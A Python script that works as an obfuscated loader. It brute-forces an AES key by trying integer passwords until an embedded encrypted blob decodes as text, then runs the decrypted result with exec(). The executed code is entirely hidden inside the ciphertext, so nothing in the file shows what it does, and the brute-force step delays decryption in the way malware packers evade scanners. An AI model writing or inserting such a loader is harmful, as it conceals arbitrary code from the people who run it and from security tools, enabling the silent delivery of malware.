from Crypto import Random
from Crypto.Cipher import AES
import hashlib

class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'b\x89\x86\x98\x83\x19x\xd3lP\xa1v\xd4\x87\xe1\xa4\x17\xce+\\\'\x803/\x0b1\xe6\xe1\xdba\xa7-14|\x1b\x01\xe4\xc6\x1b\',\x10\xb0\xa4\x81Q\x0e\xd0\xb9\x1c\xf2\xe3\x07K\x12c\xeb\xd3\xc9\x9c\xbd\xb6\xb9Q\xc0\x1bqe\xe96\xc4\xf3A\x03\xb7O\xf51Jt,X\xed\xcbz-\xe4j\xdb\xd7\xc1\x1a\xd6\xbc\xf4\x89a)[?nd\xa2\xa4^\xadw\xfb\xc97i\xe8\xb6b\xee\xa1\x7fm\x97\x06*\xe7\x86\x93$\xea\xf7\xdb\x06\xc2\x06\xa5O.4\xf3;QF\x05@\xe0\x1a\xa8g\x0b\xac\'\xbe\\~\x91\xd1\x04:\x8e:\xde\xb7\x1by\xd0\x11\xa25\\=\x7f\x1c\xa6\x82W\x83\xedYZnuc\x1c\x8b\x7f6\x013\xd9\xbe]M\x0c\xce\x99\x97\xa2\x9e2aJ\xc7C\xee=\xb6K\xaf\x98\xac\xbbtm\x01\x14\xea4\xd7;\xd3\x9d\x9d@\x06\xe7\xf9@d\xa6+\x97\x1c\x8b\xb3\x99\x1d\xa1*v=u\x8f\xac\xd9\xd6\x87J\x19\xc4\x031]\xf74\x08\x01\xdb\xb6\xc8\xb7\xdb\xda\x9e\x82".\xce]\xa0\xe1\xb8\xf4>8\xb5k\xd8;@\xc5\x86\xf507\xec9\xd2\'\xf2\x8a\xbe\xdad\x02\xec7P:\xda\xac\xaa=\xda\xf3\xa3\xe9\xee:\x08\x05q \x12Qb\x17n\xecW\x1c\x1a\xa9;|\x84\xefT\x17\x04w\x1f\x99\xee\x0f\x15\xce\x02z$A\xcda\xf6\x07\xe6\xf2\xd6\x8f\x92\t\x99P\xfaf\x9a\x8fQE\xe8\xed.!n{\x9e \xa5\x06\xa3\xad\xe4ToF\xf6\x14\x8b=\xc5M\xd7F\xe4W\xff\xa2\x086mG\xbe)a\x89\xaf\x10\'\xfc\x1a\xa9\xa7\x0f\x03F0\x9f\x7f.T\x08\x9a\x9e\xcac!F\xe1\xe1Y\x9fY\xf7Lc\xe8\x90\xee\x15D\xb7\x9d>\xab\r\x1fE\\$\\m\x1d\xbb\xc7\x1ee\xe7\xc5\x00\x9b\xa59\xe7I\x97\x14\xa3\xbe\n!?\xfdo5\x1f\x82y\\$g\xdaI\xa5\xa2\xc3*9\xb8\xe8\xc9\xa0\xc9\x1fS\xb2<\x91}\xca\x95\x9c\x9bX\xeb\x9b\x9a&\x9f\xb6\xd9\x1bJ]\xa7\xa3\x1a?\xc1j\xb6u\x7f?P:\xcfZf\xf5\t\x1cS^\xff\xd2\xccx\x03{\xbc\xa3\x03\xc0\xc7\xd4\xbe\x96lK\x05\xf7\xca\xbc\x9c\xcck\xf1\xef`\xa2G\x19\x1b\x99\xd9\xc4;\x90<b\xael3\x9e\'\x89{9\xca{v\x19\x80\xcf/\xean{\xee\xe4\xda\x0e\n*V\xe86\xc3\x15\xb9)\xb5\x16\xb4\x1d\x97\xf6Nw8>\xae[\xac\x84\xe1\xa0v\x0e\xa5\xdc\xc6\xd3\x109\xd7G\xf2\x1cj%\x8d\x03t\xbb1\x1fq\xebo\'av}\xde\xea\xba\x90\x1cq\xca\x06\xf7\x1c\r\x84\xef\xe6l\x17DD:6\xe13"\xce@?="2\n_\x02$\xbf\xca:\xdc\x02i\xd3/})\xa6\xddj\x9a\x96\xbbsu$\x06\xa3\xc2\xe7\xc2r\xb9\xe4\xd9<b\x01\x8c\xfb\x1d\x8a2\t\xfa\xc6G\x14C9m\xea>{\x12\xc0\xe2\xec\xfdN\xc8\x1e\xf0\x18\x17hIY\xc3?\x19\xbd\xf0\x9fS\x1a\xcf\x7f\xc5L\xb0\xc4]\xa4\x84\xdc(\xf5%\xcf=\xb0\x80\xf3\xa4g\x00P\xe3K\x95\x97\xd3\x03[\x95\xd7^n\x95t\xdb\x8b\x10F\xcc?\x82w\xc8\x99\x81P\xb8\x875`H\x12\x84\x14\x8b.(V\xff\xc3\xd5\xa8\xf8cK\r\x11v\xf2\x15\xd1z\xb4%pa\xc0{\xda\x81wNp\xbb7,\xcc]\xa5\t\xcf\x01\xbd\xd5\xeeC\x91\x81\xf0\xbc\x0fK\xfa\x90\xc2\xa4,\xf4\x88\xf9\xbd\xd8\xd1\x14\xf7~\xe0\x0b\xbc\xbby\\\xd9T\x82\xceFX\x97\x85\xfa\xe9\x88\x07jJA\x7f\x1dZZ;\xb8\xd8\xafR\x16\xa0\xa0\xde\x9af\x90s;e\xd8\x95\xb3z}\x9c\xfe\t\x11\x88\'\x83V\xb2\xb8\xc7\xfa\xb5\x95jU\x05\xfcT\xb5\x0e\x06\x8e\x9d\xd4|\x93\x1a\xa0\xd7\r\xa5\xf7\x8f\xd0eR\xf2\x04w\xa27d\xcbB\xfcB\xaaH\xbd\x12\xed\x97\xf7\tE\xa9\x9d\xcc\xc9\x8e\xcd\xee\xcemm\x9fT.q \xd0\\\xc2M#;\xf0\xeb\x07\x9e\xa5,\xafWo\xa9\xda\x1cd\xc6l\xc2[d\xe8;@\x8c\xa3+%\xfe\'\xf9M/]s)\xe9\x90\x1e\x0e\xb3.\xff\xb9\x07S*\xec\x14\x03\\*\xa0u\x9e\xa2\xa3\xdf\x86g\xc2\x136O\x0e\xa5k\xfc\xb5B\xc4\xf2\xf5b>\xcfF\x8e\n\x19\x00\x01Fv\x13\x9aJ\x0f\x08\t\xfb1A\xe3QsDJ\xa7\x98\x92 \xa5\xcd\xb8L\xe3\xc9-2\'\xe6\x0e\x87@\xd1m\xa4\x1b\xed\xa2\xbd\xba\x8b\xe9\xbc\xd0,X\xae\xfc\xbdy\xae1\xf5:\xbdr\xb6d\x98F6\x84JZ%\xaa0],\xc5\r\xed\xce5j6\x8c\\6\x97>{t\xb3(\xd0k\x9b\\s\x00@\xf6\x85\xdb-\xf3P\xfe\\k\xc4=\x8e\xa8\x0f\xec\xae\xda\xde\xa1\xa8{\xd3\xcd\xa5\xe8\x88\xd2\xe4Y\xb6.\xe9\xf2\xb8Bn/\x9e8\xa8\xf5\x0b~\xb6O/E\x82\xfa\x90\xb9\x15\xe55MK3"\x1e\nA\xf1\xbe\xd4\x8e\xe83\xb4F\xfb\x88\xa0S\xec\x89\x97[\x8c\x11iDKS\x18\xade\x8e\x0bq\xa4\x9b\xe5y\x18\xc0\xb2N\xa7\x92\xf84\xf0\x06e\xa3\x1e\xbe^B\xbf\x04\xfa[\xb6~\x8ay\xf5\xec\x1aLj;\xf4\xda\x13\x85\xa3,]\x93U\xab\x04\x9e\x8e\xa9l8[\xbb\xea\x9cB\xce(\xf3t\xf9\x10\x014\x8a\x17w\xa5\x82$\xbb\x81)\x13-\x8a\xaat\n\x18\xbbW\xdb.\xe6\xc0*B\x9dq\x8d\xfa\xa3.[\xe1\x946\xb9]\xd6&"\xf0\xa1\x90\xae?\xa3\x02/\xeb\xeeW\xa8kq{N\x0c\x1f\xdb\xce\xb1*=\xb4|K`\x1d\xc0\n\x9a\xf2\x19\xef\xa7\xea/b\x8cWI|\x93\xe5v\xa4v\x97\x987C]l\xb1\xf6Y&\xe6Y\x14\xf2\x9e\xc2g\xed\xcc\x1d:\x88\xe0\xef\xb0\xe6\x9c\x0b\x98T\xcd\xd7s\xa1\x07\xbdq\xa7\xf9\xb9\xd8u\xe3qSI\x00J\xf3\xbb\xbaz%\xef\xc1\xb7\x10\x1dt\xa7\xfe%\x7f\x916\x9d\xed2\xf5nO\xf8\xb1{\'\xb2_\x04\x8eB?\x13C\x14\x80\x07p\x034\xa7\xab!\xe7\xf4\xc9\xd7\x8d \xb2\xf9\xfe\xa5\xff\xaa\xf2\x7f\xd8\x9e\x8a\r\xf0:<|\xe3\x1a\xa7Z\xa9\xc9\xeb\xdc\xec\x16\xaf\xfa\x97Y\x90)\xb6\xc6l0\xf8\xdc=\x85\x02\'m\xe2\xd6\xf9\x8e\xcd\xaa\r\x7f\x16\xab\xc3\x85\x18\x82\xc2\xce\xa7\xc4\xaa/\x1b\xef\xffy\xe7\xfa\xa2\xfa\x9b\xdf\x8d\xe0\x9f\xa5\xf8C?\xa0*\xb5\x19\xa6\xe8\x88\xfe\xba\xba\xc4Z\x01.\x83\x1fzG\xe2Bz\x84\xda\x00x\xe5`\x0b\xf5\xda\xc7\x9f\xf2X\x90\xa7v\x05v\xb6Req\xb2V\x89\xcd\x1bU\x9c\xe7@\x97\n\x82\xb6\xcdO\xd4%g\xd6@\xf7\xb0\xf8.\\`\xf5`\xb6\x03 \xed\x8c\xf4\xf1\xd5\xf71\xda\xc0]\x99\xc9\x8a\xa3}baOl\xe6\xc2\x02d3\xbf60.\xb0|\x81\xd3\xe8\xe2\xde\xc5\xc2#i\xf3#\xb7|\xf2\xbd\xb0\xa9\xd2F@r\xbb~\x97T\x8a\x8aY=\xa7eQ\xc1\xd5\x1d%\xfa8\x01_\r\xf7\xd5i6At\xaa\x91\xa6*\xa5\x02O\x98\x07|k\x99%\tfK\nq-\x98G\xa7\xc1B\x9fc5nI\x87\x9cz\xd1\xa8\x96}l]\xc42\x06\xbb\xf3\x97\x02\x95\xfc\xdb\xc1\xbb\x8d\xbb\x85L\xe4\xf7SB\xae\xaaf\xc1\xdc\xb7\x15\x14\xc0-\x18\xd5\n\x95\x8b\x8d\xacl{\xfd7\x9fv\xf2v\xbe\xa9\xab\xa7\xb3=]\xa6\x13\x02\x9d\xab\xd7ih\xa9n\x96i\x98\x1a\xe8\x86 \x95\xf7\xd7\xb2O\\\x9fln\xbfbdVLs\x93\xb30x\x05\xd4\x10(ti\xdc)\xa8\x04\x9f\x01\x9fg\xec`\xca\xa2\xa0\x1e\xec\xefu\xc4\xee\x11c\xc68\x89\xde\xec\x03\xdb\x02\x04g;\xc4\xb2\t\x80\xe7pcl\xc9l\xecS\xb8fs\xa1\xb1\xea~\xf8\xcc\x88<\xc0\xc1\xd0\xae7\xefwS*d\x9bW\xb1P\xcb\x8f\xaa\xeb;\xac\x03\xcd\x11\n\xa6\xf1\x9b\xe6\xcf\xe1\x15F]2;\xe3E&yr\xa3\xf9\x94@\xb2\xea\xd6\xca\x1a\x06\x13\x0e\xbe\x14\x80\x170\xb4H\xaa\xf1*q\x93<w\x8b\xd9\x8f\x01\x9e\x8f\xc1\xac\xe3s\t\x96\xa6\xe0\xab\xb9\x1f\x85._\xf9\xac\x81\x8fr\x8db\xdeY\x1a}=2@L\xaf\x8f\xd2\xefn\xe4PP\xef\x15\xd9:\xc4\xe2\x95Q\x01\x899U?\xe7\x12\x06\xc4|%\xdf-\xd1j\xd0\xadp\x9c">\xf2\x9d|M\xcc\x91U\xef,G\x0b\xbck\xf6\xf8N\xf7H\xd3\x97\x8en\xbd\xa0\xc9\xb8\xec\xb7\xab|\x0b$\x14[\xe1\x02f>\x95k*p\xf8\x07\xc3V\xf8F#w,\n\xd8r\xeb"\xe9\xbf\xa18\xf5r\xe7Tv\xd9\x12\xd4\xb1&\t\xda\x06\x90\xba\xf9S\xf6\xdc\x92\xf6\x14[\xc9\xaasn\x9a?Lv~\xb6T9\x92\x14\xb0kqO\xf2\x10\xffk\x0c\x85*+\x082q/\xf4\x86\x05y_ N/\xf4$\'\xc9\x87\xd0{\nMp!\x03\'\x0fL[p\x04\xae\xf2\xecMx0\xb1\x86\xech\xc0\xff,q\xaa\'\x0fl\xbfs\x8d\xbeENr\xc9\x86\xd0\x13\xd8\x90\x05\x96_yc\xff\xdc]]\xdc\xc1\x15\xf5\x994\x1cdw;q"\xec\xc7\xe4\x04\xe02\xc9\x82Q\x08\xdd~\xd1\t\xd84\xe3\x1f\xc4\x9f\r~\xca[\x05\xb3\x88*\xb1\xcd\xd1\x81\\\xa4}\x8e\xd8\x1cY~M\xec}!?\x0e\x19\xafN\xc0\x9b\xd6Mh\x8e<\x8f\xd0\xc0Sg]\x01i\xa2\xe4\xbf\xd097`y\x0c\x03\xd2\x14\xd9[\xa3\x1f\xbc\x93\x06\xc5\x8c\xb9\xa7\xee$,\xb3\xd5\xff\x16=\x8fB]F\xcf\xd7C\xc4&\'> m\x1a\xe0\xc8\xe7\x1dE\xeb\xd9#:m\x8f\x8e\xfbW\x84\xeb\xb1\xf5\x81\xf1H\x8e\xf0\xca\x84\x17\xc6j+5l_\x15`\x02!A\xdcZ:\x01\xe8\xd8l\xd6\xcey\xbe\xb7i\xb2O\xc2\x012\xffU}j\xffl\x8b\x93\xb2\xcc\xa2\x02\x9e\xfb\xf4\\\xab\xc4\xd10\x192\x9c\xa6\xb1\x15w\xa4\xaf\x01\xfd{\xda/\xb0\x96(\x98O\xb4\xb4\xcf\xbb\x80\xa0\xeb\xf2\x14\x0c\x90\x0e\x00\xda6\xa5\xdb|\x9a\xf8\xcaHr\xe3\xd2Y\xda\x1f\x93\xff62\x05\x9a\xa3\xca\xa7\x95\xcfzS\xc8\x9c\x1eY\xee\x94lg\xdf?\xe1Q[\xcd\xcde\\f\x8f\xd0\xa3Op\x0c\x12@\xe5Il\x90\xc5>\n\xdd\xb41\xb6?\xc6\x8d\x9ar5\xd4\xef\x10&\xb6\xc4>\xb4\xe5\x0b\xf3\xa8S\x7f/;\xf8*n&\xdb\xfd\x8e\x92A[U\xac]\x87\x04$\xea\xc1\xaa\x9f\xd88i\xa6AJ\x9eu\x925Y\xd5\xd1\xa3  \x04\xab\xc5\xcb\xe3u*\xfb\xff\xd9"\xd1\xb25\xfc\x8d\x905\xae\x9e|U\x8b\xa6x\n6Y\xcc\x18N-\xf2\xb4\xe04\x80\x1a\x838\xeb\x9b\xebAB>\xb6\xe8*\x00@\xe5\xa8O\xdc?\xbc\xfa\x0b\x03\x94`!C\xfd\xe1\x1a\xca\n8\xf19\x04\x88$\xbb\xda\xb4<\xc4L\xdd\xe5\xb9 \x05F\xee(\x8cJ#\xeb\xac\xbb\x9c\x8f\x82\xdc\xf8l\xd4\x91\xcd~G\x9f\xa4|#\xd9X\xe9\x97\n\xa1\xae\x0b\x10\xa5\xad&Q\xd49$\x06\n\xed\x87\xe4\x89\x1c\xde\xcd\xb4#$\xa6x\xcb\n\xfb/kz\x8b$\x86\xca\x9c\xe4_\xb58\x83\xa2\xdb\x0f\xdeQB\t\xebpq\x87\xd8@\x01\xa3\xc9\xc9^"-\xa8\x1e/\x84\x12\xd3\xae\xa9x\xb37\n8rS3\x16c\xd5\x90\x08!\xd6\x92\x8a\xf2\xcf\x1c\xe3g\xd4:b\x15\xa8\x05\xd8\x02:\xd4Wg\xa8M\x0b\x86z\x99[\x01jA\x1bPSR\xab\t3\n\xc3Pz\xe4v\xc2\xa0\xe2\x8fH\x18\x7f\xa7K\xf3W\xc1\xa1\xe3\xa2\x134qz\xeb\xb1|B\xa6[Z\x9a\x13\xdc\x06u9s/w\x9a\x8e\xfc\xa4\x03-\x99\xc5\xeeC/\x01\x83\xb4\xa7d&i\xf9\x18n\x9f1r\xce}\tlv\xcb\xa2M\x97\x0f\x13\xd4\xf8%\xef\xef\x89\x812\xbck\xfd\xc5\x002\xb3WA\x96x$\xa4p2\xab\x1a\x04\x18;9Jp\xe8<\xc4u\xa3j\xe2(6N\x1cy\xaad\xbce\x03\xc6\x94\x8e\xe7$\x8e\xac!\xb3~\xf9\xf1\x8c\xbfMo\xa6\r\x98\xce\x9c\xec@\x0c\xfb\xad\x92\xfb\xf8\xc7\xc6\x8a\x90\x00\x87q\x94hR\xa5\x01\x80\xcd8}h\x80\xfb\xa4\xbb\xc7\x94^\x82<\xa5\xe8\x0f\xfbR\x90l?\xd2\xc7\xd7\xa4\xd2F\xf0\x0c/b\x8d\xa8\x85\xc3\x87z\x15\x98*\x02\xeaf\xfbZF\xfa\xb6\x19\xed\x9a\xfd\xb6\xcf\xeaC\xb9u\x11\xa7H\xf2\xfdx\xf6\xf6\xe4\xce\xb4\x16R\x8f\xdd\xa1\xaa\x83\xdaU\x05\x03\x9c3nn\xc1W\x10/\x90\x8f/@l\x18\x8ce\x9cw\xf8T\x1a\x9dX\xc3\xfd\xf3C\x90J\xc0L\xe5\x81\x1f\xf8\xae\x9e\x19\xee%+4\xb4\x0c\xd6\xd1\x8d\xc2Ns?p.\xe3\t3)\xaf\n=\xd2\xfcx,q\x8b\x8a\xbf\xd7\x95c\xf9\x1a\x0f\xea\xcc\x8f\x0c\x96Fy\x02+o\xf6\xf8\x91\xcd\xc9\xc1q\xcd\xbf!\xb8C\x98C\xec\xb7\xb6\xe3\xc7\x0f\xd6\xf0\x05\xb0\x83\x9f\xd8\xd4l\xa0t^\xb9\xb8I\x1b\xea\\\x94\xf8\xce\x8b\xeb\x17\xb5\xd8K\xa9\xb5\xc5\x99/\xab\xca\xacH\x8a\x9bI]\xd8\x07\xf076\x8d\\pu\xfb>M\x8e\xa0gS\x97r\xdf\xf5\xe8|U\x9e\xe8w\x99\x1f\xe8\xe7z\x9a$\xce\xe7\x9b\xc7\xafN\xd6\x9e\xe2\x90\x84\x9d\x93M)\xf0\xb7\xd7\x02A\r+a`\xc0&\x98\xa8\xc6\x01\xa4\xc8\x97i\x01\xdb4\xedJ]\xcb\x05!\xf9\x81\x00\x93\xe69\xe3\x943\xca\xbd\x89\x93u\x9c\xec\xffMg\x985\x01\rN\xebO)\xf3(\xd6\x13\xf9\xd9@\x12\x88Spm\x90\xd3\xf1\n\xd2\xbf\xaf\xfaI\x88\x07w\x1c \x9e\xdd\x8f\xdc\x80s.\xcb<\xcd\x11>4~f\xad\xa1\tt\xa8\x01D\xa7\xdc\xd2\xbb\xc3\xf1\x03\x8c\xf8"\xcb\xeb\xfb\xf9^\xd5\x86 \xc9\xea\xe6\xfe6G\x13\xbd\xbf\x00\xa7\xded\xdb\xed\xfa\x96\xa6\xc4d1B\xdaFY\x0fv\xb2DL#\x94\'\xb0)\xb2\xd8.c>0\xb4\xb2\xbc\xec2\xc1\x81\xa7\xe5\xc2K\xc9\x1c\xe0\\w(:7\xc2kI\x83\x03\x9f\x19\x8ed\x89_X4\xcc\xfca\x80\xad6\x96\x10\x1d\xba\x19ZQh\xfd\x95\xb3\xdag\xc6\xe7\x1b\x0f'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
